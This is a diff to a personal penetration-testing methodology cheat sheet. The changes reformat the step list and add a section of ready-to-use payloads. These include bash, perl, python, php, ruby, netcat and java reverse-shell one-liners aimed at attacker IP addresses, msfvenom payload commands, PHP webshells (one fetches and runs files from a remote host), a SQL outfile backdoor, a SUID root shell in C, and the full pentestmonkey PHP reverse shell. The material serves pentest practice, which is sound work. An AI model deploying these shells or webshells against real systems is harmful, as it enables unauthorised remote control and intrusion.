@@ -66,27 +66,23 @@ i use kali linux by offensive security. you can either use it on a virtualizatio
 **## the methodology i follow**
 
 
-- initial scoping
+**- initial scoping**
 
-- recon 
+**- recon **
 
-- enumerate all attack surfaces
+**- enumerate -> exploit**
 
-- search/create an exploit
+**- reverse shell**
 
-- run exploit
+**- upgrade shell**
 
-- get shell
+**- enumerate the target**
 
-- upgrade shell
+**- escalate privileges**
 
-- enumerate the target
+**- gain root access**
 
-- escalate privileges
-
-- gain root access
-
-- write a report
+**- write a report**
 
 
 ## scoping
@@ -128,7 +124,7 @@ shoutout to @21y4d for this
 
 [check it out on github here](https://github.com/21y4d/nmapAutomator/blob/master/nmapAutomator.sh)
 
-## enumerate 
+## enumerate -> exploit
 
 upgrade searchsploit 
 
@@ -305,9 +301,337 @@ nmap -n -v -sV -Pn -p 3306 --script=mysql-info,mysql-audit,mysql-enum,mysql-data
 mysql --host=IP -u root -p
 ```
 
+## reverse shell
 
+- creating a php backdoor shell
 
+```
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.104 lport=4444 -f raw
+```
 
+- bash 
+
+```
+bash -i >& /dev/tcp/10.10.14.40/4444 0>&1
+```
+
+- perl
+
+```
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+- python
+
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+- php
+
+```
+php -r '$sock=fsockopen("10.10.14.42",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+- php rce
+
+```
+<?php echo system($_REQUEST['zu']); ?>
+```
+
+- php one liner
+
+```
+<?php exec("/bin/bash -c ‘bash -i >& /dev/tcp/10.10.14.40/4444 0>&1’"); ?>
+```
+
+- php webshell one liner
+
+```
+<?php system($_REQUEST['cmd']); ?>
+```
+
+- php webshell for windows, upload and execute
+
+```
+<?php
+  if (isset($_REQUEST['fupload'])) {
+    file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.42:8000/" . $_REQUEST['fupload']));
+  };
+
+  if (isset($_REQUEST['fexec'])) {
+    echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
+  };
+?>
+EOF;
+```
+
+- phpadmin shell
+
+```
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
+```
+
+- ruby
+
+```
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
+
+- netcat
+
+```
+nc -e /bin/sh 10.0.0.1 1234
+```
+
+- netcat for outdated systems
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 4444 >/tmp/f
+```
+
+- netcat for windows
+
+```
+nc64.exe 10.10.14.42 4444 -e cmd.exe
+```
+
+- java
+
+```
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f war > zuk3y.war
+```
+- SUID C Shell
+
+```
+int main(void){
+
+setresuid(0, 0, 0);
+
+system("/bin/bash");
+
+}
+```
+
+- iis aspx reverse shell
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
+```
+
+- php web shell
+shoutout to www.pentestmonkey.net
+```
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  The author accepts no liability
+// for damage caused by this tool.  If these terms are not acceptable to you, then
+// do not use this tool.
+//
+// In all other respects the GPL version 2 applies:
+//
+// This program is free software; you can redistribute it and/or modify
+// it under the terms of the GNU General Public License version 2 as
+// published by the Free Software Foundation.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License along
+// with this program; if not, write to the Free Software Foundation, Inc.,
+// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  If these terms are not acceptable to
+// you, then do not use this tool.
+//
+// You are encouraged to send comments, improvements or suggestions to
+// me at pentestmonkey@pentestmonkey.net
+//
+// Description
+// -----------
+// This script will make an outbound TCP connection to a hardcoded IP and port.
+// The recipient will be given a shell running as the current user (apache normally).
+//
+// Limitations
+// -----------
+// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
+// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
+//
+// Usage
+// -----
+// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.10.14.23';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists('pcntl_fork')) {
+	// Fork and have the parent process exit
+	$pid = pcntl_fork();
+
+	if ($pid == -1) {
+		printit("ERROR: Can't fork");
+		exit(1);
+	}
+
+	if ($pid) {
+		exit(0);  // Parent exits
+	}
+
+	// Make the current process a session leader
+	// Will only succeed if we forked
+	if (posix_setsid() == -1) {
+		printit("Error: Can't setsid()");
+		exit(1);
+	}
+
+	$daemon = 1;
+} else {
+	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+// Change to a safe directory
+chdir("/");
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit("$errstr ($errno)");
+	exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+	printit("ERROR: Can't spawn shell");
+	exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+	// Check for end of TCP connection
+	if (feof($sock)) {
+		printit("ERROR: Shell connection terminated");
+		break;
+	}
+
+	// Check for end of STDOUT
+	if (feof($pipes[1])) {
+		printit("ERROR: Shell process terminated");
+		break;
+	}
+
+	// Wait until a command is end down $sock, or some
+	// command output is available on STDOUT or STDERR
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+	// If we can read from the TCP socket, send
+	// data to process's STDIN
+	if (in_array($sock, $read_a)) {
+		if ($debug) printit("SOCK READ");
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit("SOCK: $input");
+		fwrite($pipes[0], $input);
+	}
+
+	// If we can read from the process's STDOUT
+	// send data down tcp connection
+	if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit("STDOUT READ");
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit("STDOUT: $input");
+		fwrite($sock, $input);
+	}
+
+	// If we can read from the process's STDERR
+	// send data down tcp connection
+	if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit("STDERR READ");
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit("STDERR: $input");
+		fwrite($sock, $input);
+	}
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+	if (!$daemon) {
+		print "$string\n";
+	}
+}
+
+?>
+```
+
+## upgrading shell 
+
+- upgrade reverse shell
+
+```
+python3 -c "import pty; pty.spawn('/bin/bash')"
+```
+- find your own term value: ```echo $TERM```
+- export your term value```export TERM=<your own term value>```
+- ctrl+z to background the shell
+- enable passing keyboard shorcuts```stty raw -echo```
+- foreground the process:```fg```
+- reset ```reset```
+
+## privilege escalation
 
 
 
